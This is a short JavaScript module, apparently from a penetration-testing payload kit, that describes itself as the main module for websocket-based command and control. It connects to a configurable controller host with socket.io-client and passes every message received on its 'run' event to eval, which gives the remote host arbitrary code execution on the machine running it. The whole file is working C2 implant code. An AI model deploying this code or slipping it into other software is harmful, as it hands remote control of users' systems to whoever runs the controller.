/*
name: socketControl
author: mic_wg <mic@secureideas.com>
description: The main module for hooking up websocket-based C2.
variables:
  CSIK_HOST:
    type: string
    example: http://localhost:3000
*/
const io = require('socket.io-client')
const vars = require('../payloadVariables')

var socket = io(vars.CSIK_HOST)
socket.on('connect', () => {
    console.log('Connected')
})

socket.on('run', (msg) => {
    eval(msg)
})